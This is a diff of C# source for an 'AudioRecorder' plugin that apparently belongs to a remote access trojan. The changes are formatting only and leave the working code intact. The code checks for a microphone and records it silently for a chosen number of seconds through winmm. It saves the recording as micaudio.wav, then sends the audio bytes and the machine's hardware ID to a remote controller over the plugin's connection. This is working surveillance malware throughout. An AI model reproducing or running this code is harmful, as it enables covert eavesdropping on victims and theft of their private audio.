@@ -1,30 +1,33 @@
-﻿using MessagePackLib.MessagePack;
-using System;
+﻿using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Windows.Forms;
+using MessagePackLib.MessagePack;
 
 namespace Plugin
 {
     public class AudioRecorder
     {
-        private readonly string AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
-        
-        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
-        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
+        private readonly string AudioPath =
+            Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
+
+        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true,
+            ExactSpelling = true)]
+        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength,
+            int hwndCallback);
+
         [DllImport("winmm.dll")]
         public static extern int waveInGetNumDevs();
 
 
         public static void Audio(int second)
         {
-            try 
+            try
             {
                 if (waveInGetNumDevs() == 0)
                 {
                     Packet.Error("Don't have microphone.");
-                    MsgPack msgpack = new MsgPack();
+                    var msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "Audio";
                     msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                     msgpack.ForcePathObject("Close").AsString = "true";
@@ -35,19 +38,16 @@ namespace Plugin
                     var AR = new AudioRecorder();
                     AR.StartAR();
                     Thread.Sleep(100);
-                    DateTime dt1 = DateTime.Now;
-                    while ((DateTime.Now - dt1).TotalMilliseconds < second * 1000)
-                    {
-                        continue;
-                    };
+                    var dt1 = DateTime.Now;
+                    while ((DateTime.Now - dt1).TotalMilliseconds < second * 1000) continue;
+                    ;
                     AR.SaveAR();
                 }
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 Packet.Error(ex.Message);
             }
-            
         }
 
 
@@ -61,14 +61,12 @@ namespace Plugin
         {
             Record("save recsound " + AudioPath, "", 0, 0);
             Record("close recsound", "", 0, 0);
-            MsgPack msgpack = new MsgPack();
+            var msgpack = new MsgPack();
             msgpack.ForcePathObject("Pac_ket").AsString = "Audio";
             msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
             msgpack.ForcePathObject("Close").AsString = "false";
             msgpack.ForcePathObject("WavFile").SetAsBytes(File.ReadAllBytes(AudioPath));
             Connection.Send(msgpack.Encode2Bytes());
         }
-
     }
 }
-
